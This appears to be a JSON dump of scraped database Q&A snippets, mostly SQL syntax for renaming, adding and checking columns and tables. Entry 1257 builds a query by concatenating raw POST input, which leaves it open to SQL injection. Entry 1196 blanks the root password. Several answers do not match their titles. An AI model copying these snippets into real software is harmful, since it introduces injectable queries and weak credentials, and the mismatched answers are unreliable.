    "reg_date": "2021-10-12T09:55:35.000Z"
  },
  {
    "id": 1191,
    "keyword": null,
    "link": null,
    "title": " how ot change name of column mysql",
    "description": "ALTER TABLE your_table_name RENAME COLUMN original_column_name TO new_column_name;\nALTER TABLE tableName CHANGE `oldcolname` `newcolname` datatype(length);\nalter table product change price price_kg float;\n",
    "reg_date": "2021-10-12T09:55:35.000Z"
  },
  {
    "id": 1192,
    "keyword": null,
    "link": null,
    "title": " how refresh navicat tables to see new tables",
    "description": "right click on the database and select the \" refresh \" item \n",
    "reg_date": "2021-10-12T09:55:35.000Z"
  },
  {
    "id": 1193,
    "keyword": null,
    "link": null,
    "title": " how remove column in mysql",
    "description": "ALTER TABLE \"table_name\" DROP \"column_name\";\n",
    "reg_date": "2021-10-12T09:55:35.000Z"
  },
  {
    "id": 1194,
    "keyword": null,
    "link": null,
    "title": " how select from db",
    "description": "SELECT columname FROM tablename\n",
    "reg_date": "2021-10-12T09:55:35.000Z"
  },
  {
    "id": 1195,
    "keyword": null,
    "link": null,
    "title": " how to DROP a table in mysql",
    "description": "DROP TABLE table_name;\nDELETE FROM `table_name` [WHERE condition];\n-- 'DROP TABLE' followed by the name of the table you would like -- to drop. DROP TABLE `test_table`;\nDROP TABLE tablename;\ndelete table query  DROP TABLE <table name; e.g. DROP TABLE students;\nTo remove existing tables, you use the MySQL DROP TABLE statement.  Here is the basic syntax of the DROP TABLE statement:  DROP [TEMPORARY] TABLE [IF EXISTS] table_name [, table_name] ... [RESTRICT | CASCADE] The DROP TABLE statement removes a table and its data permanently from the database. In MySQL, you can also remove multiple tables using a single DROP TABLE statement, each table is separated by a comma (,).  The TEMPORARY option allows you to remove temporary tables only. It ensures that you do not accidentally remove non-temporary tables.  The IF EXISTS option conditionally drop a table only if it exists. If you drop a non-existing table with the IF EXISTS option, MySQL generates a NOTE, which can be retrieved using the SHOW WARNINGS statement.  Note that the DROP TABLE statement only drops tables. It doesn&rsquo;t remove specific user privileges associated with the tables. Therefore, if you create a table with the same name as the dropped one, MySQL will apply the existing privileges to the new table, which may pose a security risk.  The RESTRICT and CASCADE  options are reserved for the future versions of MySQL.\n",
    "reg_date": "2021-10-12T09:55:35.000Z"
  },
  {
    "id": 1196,
    "keyword": null,
    "link": null,
    "title": " how to access to mysql without root",
    "description": "mysql > ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY ''; mysql > FLUSH PRIVILEGES; \n",
    "reg_date": "2021-10-12T09:55:35.000Z"
  },
  {
    "id": 1197,
    "keyword": null,
    "link": null,
    "title": " how to access wordpress database",
    "description": "# Download the phpmyadmin plugin  link- https://wordpress.org/plugins/wp-phpmyadmin-extension/  or  Search in plugin \"phpmyadmin\"\n",
    "reg_date": "2021-10-12T09:55:36.000Z"
  },
  {
    "id": 1198,
    "keyword": null,
    "link": null,
    "title": " how to add CHECK constraint to a column in postgres",
    "description": "alter table foo     add constraint check_positive check (some_code in ('A','B')); \nALTER TABLE foo     ADD CHECK (column_1 > 2); \n",
    "reg_date": "2021-10-12T09:55:36.000Z"
  },
  {
    "id": 1199,
    "keyword": null,
    "link": null,
    "title": " how to add boolean column in postgresql",
    "description": "ALTER TABLE users   ADD COLUMN \"priv_user\" BOOLEAN DEFAULT FALSE; \nPostgreSQL supports a single Boolean data type: BOOLEAN that can have three values: true , false and NULL . PostgreSQL uses one byte for storing a boolean value in the database. The BOOLEAN can be abbreviated as BOOL .\n",
    "reg_date": "2021-10-12T09:55:36.000Z"
  },
  {
    "id": 1200,
    "keyword": null,
    "link": null,
    "title": " how to add column to table sql",
    "description": "ALTER TABLE Customers ADD Email varchar(255); \nALTER TABLE table_name ADD column_name varchar(50);\nALTER TABLE table ADD COLUMN column VARCHAR (255) NOT NULL AFTER column;\nALTER TABLE dbo.doc_exa  ADD column_b VARCHAR(20) NULL,  \tcolumn_c INT NULL ;\n                                                     ALTER TABLE vendors ADD COLUMN phone VARCHAR(15) AFTER name; Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:55:36.000Z"
  },
  {
    "id": 1201,
    "keyword": null,
    "link": null,
    "title": " how to add default constraint in mysql",
    "description": "ALTER TABLE \"name_table\" ALTER \"name_column\"  SET DEFAULT value_default;\n//Sql Server  //Add a table  ALTER TABLE clients ADD Points INT DEFAULT 0 //Edit an existing table ALTER TABLE clients ADD CONSTRAINT points DEFAULT 0 FOR Points\nName Varchar(255) default \"Fred\"\n",
    "reg_date": "2021-10-12T09:55:36.000Z"
  },
  {
    "id": 1202,
    "keyword": null,
    "link": null,
    "title": " how to add month in update sql",
    "description": "UPDATE users SET date = DATEADD(MONTH, 1, date) \nUPDATE users SET date = DATE_ADD(date, INTERVAL 1 month ) \nUPDATE users SET date = ADD_MONTHS(date, 1) \n",
    "reg_date": "2021-10-12T09:55:36.000Z"
  },
  {
    "id": 1203,
    "keyword": null,
    "link": null,
    "title": " how to add more columns to a table in mysql",
    "description": "                                CREATE TABLE IF NOT EXISTS vendors (     id INT AUTO_INCREMENT PRIMARY KEY,     name VARCHAR(255) ); ALTER TABLE vendors ADD COLUMN phone VARCHAR(15) AFTER name;\n",
    "reg_date": "2021-10-12T09:55:37.000Z"
  },
  {
    "id": 1204,
    "keyword": null,
    "link": null,
    "title": " how to add multiple condition in mysql query",
    "description": "SELECT suppliers.suppler_name, orders.order_id FROM suppliers, orders WHERE suppliers.supplier_id = orders.supplier_id AND suppliers.state = 'California';\n",
    "reg_date": "2021-10-12T09:55:37.000Z"
  },
  {
    "id": 1205,
    "keyword": null,
    "link": null,
    "title": " how to add not null constraint in sql",
    "description": "ALTER TABLE table_name MODIFY column_name datatype NOT NULL; \nBy default, a column can hold NULL values. The NOT NULL constraint enforces a column to NOT accept NULL values. This enforces a field to always contain a value, which means that you cannot insert a new record, or update a record without adding a value to this field.  Sql NOT NULL in creating a table CREATE TABLE Persons (     ID int NOT NULL,     LastName varchar(255) NOT NULL,     FirstName varchar(255) NOT NULL,     Age int );\nID int(10) NOT NULL;\n",
    "reg_date": "2021-10-12T09:55:37.000Z"
  },
  {
    "id": 1206,
    "keyword": null,
    "link": null,
    "title": " how to add privilege in mysql user",
    "description": "GRANT ALL PRIVILEGES ON database_name. * TO 'username'@'localhost';\nCREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password'; \n",
    "reg_date": "2021-10-12T09:55:37.000Z"
  },
  {
    "id": 1207,
    "keyword": null,
    "link": null,
    "title": " how to add records to sql table",
    "description": "INSERT INTO Customer (FirstName, LastName, City, Country, Phone) VALUES ('Craig', 'Smith', 'New York', 'USA', 1-01-993 2800)\n",
    "reg_date": "2021-10-12T09:55:37.000Z"
  },
  {
    "id": 1208,
    "keyword": null,
    "link": null,
    "title": " how to add timestamp column in mysql",
    "description": "ALTER TABLE `table1` ADD `lastUpdated` TIMESTAMP ON UPDATE CURRENT_TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP ; \n",
    "reg_date": "2021-10-12T09:55:37.000Z"
  },
  {
    "id": 1209,
    "keyword": null,
    "link": null,
    "title": " how to add unique constraint in mysql table",
    "description": "ALTER TABLE mytbl ADD UNIQUE (columnName);\n",
    "reg_date": "2021-10-12T09:55:37.000Z"
  },
  {
    "id": 1210,
    "keyword": null,
    "link": null,
    "title": " how to add unique key constraint in mysql",
    "description": "-- Add a Unique constraint and deifine the constraint name ALTER TABLE TABLENAME ADD\tCONSTRAINT UQ_tblPerson_Email UNIQUE(COLUMN_NAME)\n",
    "reg_date": "2021-10-12T09:55:37.000Z"
  },
  {
    "id": 1211,
    "keyword": null,
    "link": null,
    "title": " how to add where command in update comand with joins",
    "description": "UPDATE A SET foo = B.bar FROM TableA A JOIN TableB B     ON A.col1 = B.colx WHERE ...\n",
    "reg_date": "2021-10-12T09:55:37.000Z"
  },
  {
    "id": 1212,
    "keyword": null,
    "link": null,
    "title": " how to alter table column name in mysql",
    "description": "ALTER TABLE your_table_name RENAME COLUMN original_column_name TO new_column_name;\nALTER TABLE table_name CHANGE old_column_name new_column_name datatype(length);\nALTER TABLE contacts   ADD last_name varchar(40) NOT NULL     AFTER contact_id,   ADD first_name varchar(35) NULL     AFTER last_name;\n",
    "reg_date": "2021-10-12T09:55:38.000Z"
  },
  {
    "id": 1213,
    "keyword": null,
    "link": null,
    "title": " how to alter table name in mysql",
    "description": "RENAME TABLE tb1 TO tb2;\nRENAME TABLE old_table TO new_table;\nRENAME TABLE old_table_name TO new_table_name; \t\t\t\t\tor ALTER TABLE old_table_name RENAME TO new_table_name;  \t\t\t\t\tor ALTER TABLE old_table_name RENAME new_table_name;                 \nRENAME TABLE old_name TO new_name; -- or ALTER TABLE old_name RENAME TO new_name;  -- or ALTER TABLE old_name RENAME new_name;                 \nALTER TABLE tableName CHANGE `oldcolname` `newcolname` datatype(length);\n-- mysql ALTER TABLE `members` CHANGE COLUMN `full_names` `fullname` char(250) NOT NULL;\n",
    "reg_date": "2021-10-12T09:55:38.000Z"
  },
  {
    "id": 1214,
    "keyword": null,
    "link": null,
    "title": " how to ascending order in sql",
    "description": "SELECT * FROM employees ORDER BY employees.employee_id DESC ; &middot;        Ascending ( ASC) &middot;        Descending ( DESC)\nSELECT * FROM employees ORDER BY employees.employee_id DESC ;\n",
    "reg_date": "2021-10-12T09:55:38.000Z"
  },
  {
    "id": 1215,
    "keyword": null,
    "link": null,
    "title": " how to assign date field for table in mysql",
    "description": "DATE_FORMAT(date, format) -- E.g. SELECT DATE_FORMAT(dateField, '%m/%d/%Y') FROM TableName; -- See https://www.mysqltutorial.org/mysql-date_format/ for available formats\n                                     CREATE TABLE people (     id INT AUTO_INCREMENT PRIMARY KEY,     first_name VARCHAR(50) NOT NULL,     last_name VARCHAR(50) NOT NULL,     birth_date DATE NOT NULL );\n",
    "reg_date": "2021-10-12T09:55:38.000Z"
  },
  {
    "id": 1216,
    "keyword": null,
    "link": null,
    "title": " how to auto increment in sql",
    "description": "Alter table table_name modify column_name datatype(length) AUTO_INCREMENT PRIMARY KEY \nCREATE TABLE Persons (     Personid int NOT NULL AUTO_INCREMENT,     LastName varchar(255) NOT NULL,     FirstName varchar(255),     Age int,     PRIMARY KEY (Personid) ); INSERT INTO Persons (FirstName,LastName) VALUES ('Lars','Monsen');\n",
    "reg_date": "2021-10-12T09:55:38.000Z"
  },
  {
    "id": 1217,
    "keyword": null,
    "link": null,
    "title": " how to backup mysql database linux",
    "description": "mysqldump -u<user_name> -p<user_password> <database_name> > <file_name>.sql\nmysqldump -u username -p databasename > database_backup.sql\nmysqldump database_name > database_name.sql\nmysql -u<user_name> -puser_password> <database_name> source /path/db.sql\n",
    "reg_date": "2021-10-12T09:55:38.000Z"
  },
  {
    "id": 1218,
    "keyword": null,
    "link": null,
    "title": " how to break a while loop in mssql",
    "description": "                                     WHILE Boolean_expression BEGIN     -- statements    IF condition         BREAK;     -- other statements     END \n",
    "reg_date": "2021-10-12T09:55:38.000Z"
  },
  {
    "id": 1219,
    "keyword": null,
    "link": null,
    "title": " how to calculate number of days between two dates excluding weekends in oracle",
    "description": "-- All dates between 01/07/2021 and 15/07/2021 excluding weekends SELECT CAL_DATE FROM (          SELECT to_date('01/07/2021', 'DD/MM/YYYY') + ROWNUM - 1 AS CAL_DATE          FROM ALL_OBJECTS          WHERE ROWNUM <= to_date('15/07/2021', 'DD/MM/YYYY')                               - to_date('01/07/2021', 'DD/MM/YYYY') + 1) WHERE to_char(CAL_DATE, 'DY', 'NLS_DATE_LANGUAGE=AMERICAN') NOT IN ('SAT', 'SUN');\n",
    "reg_date": "2021-10-12T09:55:38.000Z"
  },
  {
    "id": 1220,
    "keyword": null,
    "link": null,
    "title": " how to change a collumn name in sql",
    "description": "-- Oracle, MySQL 8+ ALTER TABLE table_name RENAME COLUMN current_name TO new_name; -- MySQL < 8: ALTER TABLE table_name CHANGE current_name new_name datatype(length); -- SQL Server: EXEC SP_RENAME 'table_name.current_name' , 'new_name', 'COLUMN'\nALTER TABLE nom_table RENAME COLUMN colonne_ancien_nom TO colonne_nouveau_nom\nALTER TABLE `table_name`  CHANGE `old_name` `new_name` VARCHAR(10)  CHARACTER SET utf8  COLLATE utf8_general_ci NULL  DEFAULT NULL;\n",
    "reg_date": "2021-10-12T09:55:38.000Z"
  },
  {
    "id": 1221,
    "keyword": null,
    "link": null,
    "title": " how to change column name in mysql",
    "description": "ALTER TABLE `members` CHANGE COLUMN `full_names` `fullname` varchar(100) NOT NULL;\nRENAME TABLE old_name TO new_name; -- or ALTER TABLE old_name RENAME TO new_name;  -- or ALTER TABLE old_name RENAME new_name;                 \nALTER TABLE your_table_name RENAME COLUMN original_column_name TO new_column_name;\nALTER TABLE tableName CHANGE `oldcolname` `newcolname` datatype(length); (you can remove the backticks if it doesn't work)\nALTER TABLE tableName CHANGE `oldcolname` `newcolname` datatype(length);\nalter table product change price price_kg float;\n",
    "reg_date": "2021-10-12T09:55:38.000Z"
  },
  {
    "id": 1222,
    "keyword": null,
    "link": null,
    "title": " how to change column name in sql",
    "description": "--The following example renames the column TerritoryID in the table Sales.SalesTerritory to TerrID in the AdventureWorks database.  EXEC sp_rename 'Sales.SalesTerritory.TerritoryID', 'TerrID', 'COLUMN';\nEXEC SP_RENAME 'TABLE_NAME.OLD_COLUMN_NAME','NEW_COLUMN_NAME'\nEXEC sp_RENAME 'table_name.old_name', 'new_name', 'COLUMN' \nALTER TABLE \"table_name\" RENAME COLUMN \"column 1\" TO \"column 2\";\nALTER TABLE table_name RENAME COLUMN old_name TO new_name;\nALTER TABLE Student RENAME COLUMN NAME TO FIRST_NAME; ALTER TABLE `Table Name` MODIFY COLUMN `Column Name` Datatype(Size);\n",
    "reg_date": "2021-10-12T09:55:38.000Z"
  },
  {
    "id": 1223,
    "keyword": null,
    "link": null,
    "title": " how to change column type psql",
    "description": "                                     ALTER TABLE assets ALTER COLUMN name TYPE VARCHAR; \nALTER TABLE table_name ALTER COLUMN column_name [SET DATA] TYPE new_data_type;\nALTER TABLE table_name ALTER COLUMN column_name [SET DATA] TYPE new_data_type;   \n",
    "reg_date": "2021-10-12T09:55:39.000Z"
  },
  {
    "id": 1224,
    "keyword": null,
    "link": null,
    "title": " how to change mysql root password in windows 10",
    "description": "ALTER USER 'root'@'localhost' IDENTIFIED BY 'NewPassword';\n",
    "reg_date": "2021-10-12T09:55:39.000Z"
  },
  {
    "id": 1225,
    "keyword": null,
    "link": null,
    "title": " how to change owner in postgres",
    "description": "ALTER DATABASE name OWNER TO new_owner; \n",
    "reg_date": "2021-10-12T09:55:39.000Z"
  },
  {
    "id": 1226,
    "keyword": null,
    "link": null,
    "title": " how to change server name in sql server",
    "description": "-- If you find any mismatch, then you need to follow below steps:  -- 1. Execute below to drop the current server name  \tEXEC sp_DROPSERVER 'oldservername'      -- 2. Execute below to add a new server name. Make sure local is specified.  \tEXEC sp_ADDSERVER 'newservername', 'local'  -- 3. Restart SQL Services.  -- 4. Verify the new name using:  \tSELECT @@SERVERNAME \tSELECT * FROM sys.servers WHERE server_id = 0      -- I must point out that you should not perform rename if you are using:  \t-- 1. SQL Server is clustered. \t-- 2. Using replication. \t-- 3. Reporting Service is installed.\n",
    "reg_date": "2021-10-12T09:55:39.000Z"
  },
  {
    "id": 1227,
    "keyword": null,
    "link": null,
    "title": " how to change table name in sqlite",
    "description": "ALTER TABLE table_name RENAME TO new_table_name;\n",
    "reg_date": "2021-10-12T09:55:39.000Z"
  },
  {
    "id": 1228,
    "keyword": null,
    "link": null,
    "title": " how to change the auto increment in existing table mysql",
    "description": "ALTER TABLE tbl_access ADD COLUMN `access_id` int(10) NOT NULL PRIMARY KEY AUTO_INCREMENT FIRST \n",
    "reg_date": "2021-10-12T09:55:39.000Z"
  },
  {
    "id": 1229,
    "keyword": null,
    "link": null,
    "title": " how to change the column name in sql",
    "description": "EXEC SP_RENAME 'TABLE_NAME.OLD_COLUMN_NAME','NEW_COLUMN_NAME'\nALTER TABLE \"table_name\" RENAME COLUMN \"column 1\" TO \"column 2\";\nALTER TABLE table_name RENAME COLUMN old_name TO new_name;\nALTER TABLE table_name CHANGE COLUMN old_name TO new_name; \nALTER TABLE `Table Name` MODIFY COLUMN `Column Name` Datatype(Size);\n-- Microsoft SQL style EXEC sp_rename 'TableOldName', 'TableNewName';\n",
    "reg_date": "2021-10-12T09:55:39.000Z"
  },
  {
    "id": 1230,
    "keyword": null,
    "link": null,
    "title": " how to change the font size in the box column sql server",
    "description": "how to change the font size in the box column sql server\n",
    "reg_date": "2021-10-12T09:55:39.000Z"
  },
  {
    "id": 1231,
    "keyword": null,
    "link": null,
    "title": " how to change the port on xampp mysql",
    "description": "Step 1: First, reach in the folder where you have installed your Xampp Software.  Step 2: After that, go to the destination file &ndash; mysql/bin/my.ini (The &lsquo;my&lsquo; file with extension of Configuration Settings)  Step 3: In that file, you&rsquo;ll be seeing some lines of code like this:  # The following options will be passed to all MySQL clients [client]  # password = your_password  port = 3306 socket = \"xampp / mysql / mysql.sock\" Just change the port to 3306 ---> 3308 instead of 3306.  Step 4: Just below, you would find these lines of code:  # The MySQL server [mysqld] port= 3306 socket = \"xampp / mysql / mysql.sock\" Just like before, here also update the port attribute to 3306 ---> 3308 instead of 3306.  Step 5: And that&rsquo;s all! Just close off MySQL and Start it again to see the new port working.\n",
    "reg_date": "2021-10-12T09:55:39.000Z"
  },
  {
    "id": 1232,
    "keyword": null,
    "link": null,
    "title": " how to change the value of a table in sql",
    "description": "UPDATE employees  SET      address = '1300 Carter St',     city = 'San Jose',     postalcode = 95125,     region = 'CA' WHERE     employeeID = 3; \n",
    "reg_date": "2021-10-12T09:55:40.000Z"
  },
  {
    "id": 1233,
    "keyword": null,
    "link": null,
    "title": " how to check all scheduled jobs in oracle",
    "description": "select owner as schema_name,        job_name,        job_style,        case when job_type is null                   then 'PROGRAM'             else job_type end as job_type,          case when job_type is null                  then program_name                  else job_action end as job_action,        start_date,        case when repeat_interval is null             then schedule_name             else repeat_interval end as schedule,        last_start_date,        next_run_date,        state from sys.all_scheduler_jobs order by owner,          job_name; Code has been copied\n",
    "reg_date": "2021-10-12T09:55:40.000Z"
  },
  {
    "id": 1234,
    "keyword": null,
    "link": null,
    "title": " how to check connection with sql server in c#",
    "description": "/// <summary> /// Test that the server is connected /// </summary> /// <param name=\"connectionString\">The connection string</param> /// <returns>true if the connection is opened</returns> private static bool IsServerConnected(string connectionString) {     using (SqlConnection connection = new SqlConnection(connectionString))     {         try         {             connection.Open();             return true;         }         catch (SqlException)         {             return false;         }     } }\n",
    "reg_date": "2021-10-12T09:55:40.000Z"
  },
  {
    "id": 1235,
    "keyword": null,
    "link": null,
    "title": " how to check data type in sql server",
    "description": "SELECT DATA_TYPE  FROM INFORMATION_SCHEMA.COLUMNS WHERE       TABLE_NAME = 'yourTableName' AND       COLUMN_NAME = 'yourColumnName'\n10,000\n",
    "reg_date": "2021-10-12T09:55:40.000Z"
  },
  {
    "id": 1236,
    "keyword": null,
    "link": null,
    "title": " how to check database engine in mysql",
    "description": "SELECT TABLE_NAME, ENGINE FROM information_schema.TABLES where TABLE_SCHEMA = 'database';\n",
    "reg_date": "2021-10-12T09:55:40.000Z"
  },
  {
    "id": 1237,
    "keyword": null,
    "link": null,
    "title": " how to check database in postgresql",
    "description": "postgres=# \\l\npostgres=# \\l \n\\l OR \\l+\n",
    "reg_date": "2021-10-12T09:55:40.000Z"
  },
  {
    "id": 1238,
    "keyword": null,
    "link": null,
    "title": " how to check default value of column in sql server",
    "description": "SELECT object_definition(default_object_id) AS definition FROM   sys.columns WHERE  name      ='colname' AND    object_id = object_id('dbo.tablename')\n",
    "reg_date": "2021-10-12T09:55:40.000Z"
  },
  {
    "id": 1239,
    "keyword": null,
    "link": null,
    "title": " how to check even or odd in sql",
    "description": "SELECT *  FROM table_name  WHERE mod(column_name,2) = 0;\n",
    "reg_date": "2021-10-12T09:55:40.000Z"
  },
  {
    "id": 1240,
    "keyword": null,
    "link": null,
    "title": " how to check foreign key constraint in sql",
    "description": "sp_help 'TableName' \n",
    "reg_date": "2021-10-12T09:55:40.000Z"
  },
  {
    "id": 1241,
    "keyword": null,
    "link": null,
    "title": " how to check if a column is null in sql",
    "description": "SELECT column_name FROM table_name  WHERE column_name IS NULL;\n",
    "reg_date": "2021-10-12T09:55:40.000Z"
  },
  {
    "id": 1242,
    "keyword": null,
    "link": null,
    "title": " how to check if mysql server is running",
    "description": "- Linux, choose: sudo service mysql status mysqladmin -u root -p status /etc/init.d/mysql status  -- Windows, choose: C:\\> \"C:\\Program Files\\MySQL\\MySQL Server 5.7\\bin\\mysqlshow\" C:\\> \"C:\\Program Files\\MySQL\\MySQL Server 5.7\\bin\\mysqlshow\" -u root mysql C:\\> \"C:\\Program Files\\MySQL\\MySQL Server 5.7\\bin\\mysqladmin\" version status proc C:\\> \"C:\\Program Files\\MySQL\\MySQL Server 5.7\\bin\\mysql\" test\n",
    "reg_date": "2021-10-12T09:55:40.000Z"
  },
  {
    "id": 1243,
    "keyword": null,
    "link": null,
    "title": " how to check last gather stats on table in oracle",
    "description": "SELECT ST.TABLE_NAME, ST.PARTITION_NAME, HIGH_VALUE, ST.NUM_ROWS,  \t   ST.BLOCKS, ST.LAST_ANALYZED FROM DBA_TAB_STATISTICS ST LEFT JOIN DBA_TAB_PARTITIONS PAR ON PAR.TABLE_NAME = ST.TABLE_NAME AND PAR.PARTITION_NAME = ST.PARTITION_NAME WHERE ST.OWNER = 'MY_OWNER'   AND ST.TABLE_NAME = 'MY_TABLE' ORDER BY PARTITION_NAME;\n",
    "reg_date": "2021-10-12T09:55:41.000Z"
  },
  {
    "id": 1244,
    "keyword": null,
    "link": null,
    "title": " how to check mysql version in xampp",
    "description": "# Console: mysql -V mysql --version # Query: SHOW VARIABLES LIKE \"%version%\"; # PHPMyAdmin Interface, on the right side: > Database server > Server version\n",
    "reg_date": "2021-10-12T09:55:41.000Z"
  },
  {
    "id": 1245,
    "keyword": null,
    "link": null,
    "title": " how to check mysql version ubuntu",
    "description": "#Type mysql --version #to see if it is installed.\nSHOW VARIABLES LIKE \"%version%\"; +-------------------------+------------------------------------------+ | Variable_name           | Value                                    | +-------------------------+------------------------------------------+ | protocol_version        | 10                                       | | version                 | 5.0.27-standard                          | | version_comment         | MySQL Community Edition - Standard (GPL) | | version_compile_machine | i686                                     | | version_compile_os      | pc-linux-gnu                             | +-------------------------+------------------------------------------+ 5 rows in set (0.04 sec)\n# Console: mysql -V mysql --version # Query: SHOW VARIABLES LIKE \"%version%\"; # PHPMyAdmin Interface, on the right side: > Database server > Server version\nMysql version mysql -V\n",
    "reg_date": "2021-10-12T09:55:41.000Z"
  },
  {
    "id": 1246,
    "keyword": null,
    "link": null,
    "title": " how to check nls format in oracle",
    "description": "SELECT * FROM (SELECT 'SESSION' SCOPE, nsp.* FROM NLS_SESSION_PARAMETERS nsp       UNION ALL       SELECT 'DATABASE' SCOPE, ndp.* FROM NLS_DATABASE_PARAMETERS ndp       UNION ALL       SELECT 'INSTANCE' SCOPE, nip.* FROM NLS_INSTANCE_PARAMETERS nip) a PIVOT (listagg(VALUE) WITHIN GROUP (ORDER BY SCOPE) FOR SCOPE IN (     'SESSION' AS \"SESSION\" ,'DATABASE' AS DATABASE ,'INSTANCE' AS INSTANCE)); -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T09:55:41.000Z"
  },
  {
    "id": 1247,
    "keyword": null,
    "link": null,
    "title": " how to check nls timestamp format in oracle",
    "description": "SELECT * FROM (SELECT 'SESSION' SCOPE, nsp.* FROM NLS_SESSION_PARAMETERS nsp       UNION ALL       SELECT 'DATABASE' SCOPE, ndp.* FROM NLS_DATABASE_PARAMETERS ndp       UNION ALL       SELECT 'INSTANCE' SCOPE, nip.* FROM NLS_INSTANCE_PARAMETERS nip) a PIVOT (listagg(VALUE) WITHIN GROUP (ORDER BY SCOPE) FOR SCOPE IN (     'SESSION' AS \"SESSION\" ,'DATABASE' AS DATABASE ,'INSTANCE' AS INSTANCE)); -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T09:55:41.000Z"
  },
  {
    "id": 1248,
    "keyword": null,
    "link": null,
    "title": " how to check port number for postgresql",
    "description": "SELECT * FROM pg_settings WHERE name = 'port';\n",
    "reg_date": "2021-10-12T09:55:41.000Z"
  },
  {
    "id": 1249,
    "keyword": null,
    "link": null,
    "title": " how to check schema privileges in oracle",
    "description": "-- List privileges, including roles, for my_user SELECT GRANTEE, PRIVILEGE AS PRIVILEGE_ROLE,        NULL AS OWNER, NULL AS TABLE_NAME, NULL AS COLUMN_NAME,        ADMIN_OPTION AS PRIVILEGE,         NULL AS GRANTABLE FROM DBA_SYS_PRIVS WHERE GRANTEE = 'my_user' UNION ALL SELECT r.GRANTEE, r.GRANTED_ROLE AS PRIVILEGE_ROLE, p.OWNER, p.TABLE_NAME,  \tp.COLUMN_NAME, PRIVILEGE, p.GRANTABLE FROM DBA_ROLE_PRIVS r LEFT JOIN ROLE_TAB_PRIVS p ON p.ROLE = r.GRANTED_ROLE WHERE r.GRANTEE = 'my_user';\n",
    "reg_date": "2021-10-12T09:55:41.000Z"
  },
  {
    "id": 1250,
    "keyword": null,
    "link": null,
    "title": " how to check sql server agent job history",
    "description": "-In Object Explorer, connect to an instance of the SQL Server Database Engine, and then expand that instance. -Expand SQL Server Agent, and then expand Jobs. -Right-click a job, and then click View History. -In the Log File Viewer, view the job history. -To update the job history, click Refresh.\n",
    "reg_date": "2021-10-12T09:55:41.000Z"
  },
  {
    "id": 1251,
    "keyword": null,
    "link": null,
    "title": " how to check table exists or not in postgresql",
    "description": "SELECT 1 FROM information_schema.tables WHERE table_schema = 'schema_name'\tAND table_name = 'table_name';\n",
    "reg_date": "2021-10-12T09:55:41.000Z"
  },
  {
    "id": 1252,
    "keyword": null,
    "link": null,
    "title": " how to check table name in current database sql",
    "description": "BY LOVE SINGH  SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='YOUR_Database_name'\nShowing all table:  show tables;  Showing table data: SELECT * or column_names FROM table_name;\nSELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG=db_name()  and TABLE_NAME like'%table_name%'--to check particular table\n",
    "reg_date": "2021-10-12T09:55:41.000Z"
  },
  {
    "id": 1253,
    "keyword": null,
    "link": null,
    "title": " how to check the port of mysql installation in mac",
    "description": "lsof -n -P -i TCP -s TCP:LISTEN\n",
    "reg_date": "2021-10-12T09:55:42.000Z"
  },
  {
    "id": 1254,
    "keyword": null,
    "link": null,
    "title": " how to check username in mysql command line",
    "description": "SELECT User, Host FROM mysql.user;\nSELECT USER(); \n",
    "reg_date": "2021-10-12T09:55:42.000Z"
  },
  {
    "id": 1255,
    "keyword": null,
    "link": null,
    "title": " how to check which sp is running in sql server",
    "description": "SELECT   object_name(st.objectid) as ProcName FROM   sys.dm_exec_connections as qs  CROSS APPLY sys.dm_exec_sql_text(qs.most_recent_sql_handle) st  WHERE   object_name(st.objectid) is not null \n",
    "reg_date": "2021-10-12T09:55:42.000Z"
  },
  {
    "id": 1256,
    "keyword": null,
    "link": null,
    "title": " how to check which table has data in mysql",
    "description": "mysql> SELECT table_name, table_rows    ->FROM INFORMATION_SCHEMA.TABLES    ->WHERE TABLE_SCHEMA = 'business';\n",
    "reg_date": "2021-10-12T09:55:42.000Z"
  },
  {
    "id": 1257,
    "keyword": null,
    "link": null,
    "title": " how to ckeck that email is present in databse in mysqli",
    "description": "$select = mysqli_query($connectionID, \"SELECT `email` FROM `game` WHERE `email` = '\".$_POST['email'].\"'\") or exit(mysqli_error($connectionID)); if(mysqli_num_rows($select)) {     exit('This email is already being used'); }\n",
    "reg_date": "2021-10-12T09:55:42.000Z"
  },
  {
    "id": 1258,
    "keyword": null,
    "link": null,
    "title": " how to clear command prompt when using MySQL",
    "description": "For window use \"\\! cls\" For Linux use \"Ctrl + L\"\n",
    "reg_date": "2021-10-12T09:55:42.000Z"
  },
  {
    "id": 1259,
    "keyword": null,
    "link": null,
    "title": " how to close external sql connection in laravel",
    "description": "$pdo = DB::connection()->getPdo();\n",
    "reg_date": "2021-10-12T09:55:42.000Z"
  },
  {
    "id": 1260,
    "keyword": null,
    "link": null,
    "title": " how to combine 2 tables in MySQL",
    "description": "SELECT user_id, user_name FROM users UNION SELECT organization_id, organization_name FROM organizations\ncreate table yourTableName (    select *from yourTableName1 ) UNION (    select *from yourTableName2 );\n",
    "reg_date": "2021-10-12T09:55:42.000Z"
  },
  {
    "id": 1261,
    "keyword": null,
    "link": null,
    "title": " how to combine diff colmun value using group by postgres",
    "description": "SELECT movie, string_agg(actor, ', ') AS actor_list FROM   tbl GROUP  BY 1;\nSELECT movie, string_agg(actor, ', ' ORDER BY actor) AS actor_list FROM   tbl GROUP  BY 1;\n",
    "reg_date": "2021-10-12T09:55:42.000Z"
  },
  {
    "id": 1262,
    "keyword": null,
    "link": null,
    "title": " how to combine first and last nae into one columb sql",
    "description": "select CONCAT(FirstName , ' ' , MiddleName , ' ' , Lastname) as Name from    TableName\n",
    "reg_date": "2021-10-12T09:55:42.000Z"
  },
  {
    "id": 1263,
    "keyword": null,
    "link": null,
    "title": " how to connect database foreign key in mysql",
    "description": "                                     CREATE TABLE products(     productId INT AUTO_INCREMENT PRIMARY KEY,     productName varchar(100) not null,     categoryId INT NOT NULL,     CONSTRAINT fk_category     FOREIGN KEY (categoryId)      REFERENCES categories(categoryId)         ON UPDATE CASCADE         ON DELETE CASCADE ) ENGINE=INNODB;\n",
    "reg_date": "2021-10-12T09:55:42.000Z"
  },
  {
    "id": 1264,
